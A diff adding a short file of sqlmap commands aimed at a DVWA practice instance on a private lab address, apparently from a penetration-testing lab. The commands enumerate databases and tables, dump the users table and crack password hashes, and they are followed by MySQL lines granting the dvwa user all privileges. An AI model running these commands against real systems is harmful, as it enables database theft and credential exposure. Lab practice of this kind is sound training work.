@@ -1,0 +1,11 @@
+sqlmap -u "http://192.168.25.129/DVWA/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=n1h9mnosujjq4tcfi0rfm60ep9" --batch --passwords
+sqlmap -u "http://192.168.25.129/DVWA/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=n1h9mnosujjq4tcfi0rfm60ep9" --batch --users --dump
+sqlmap -u "http://192.168.25.129/DVWA/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=n1h9mnosujjq4tcfi0rfm60ep9" --batch --dbs
+sqlmap -u "http://192.168.25.129/DVWA/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=n1h9mnosujjq4tcfi0rfm60ep9" --batch -D dvwa --tables
+sqlmap -u "http://192.168.25.129/DVWA/vulnerabilities/sqli/?id=2&Submit=Submit#" --cookie="security=low; PHPSESSID=n1h9mnosujjq4tcfi0rfm60ep9" --batch -D dvwa -T users --dump
+
+
+
+GRANT ALL PRIVILEGES ON mysql.* TO 'dvwa'@'localhost';
+FLUSH PRIVILEGES;
+EXIT;
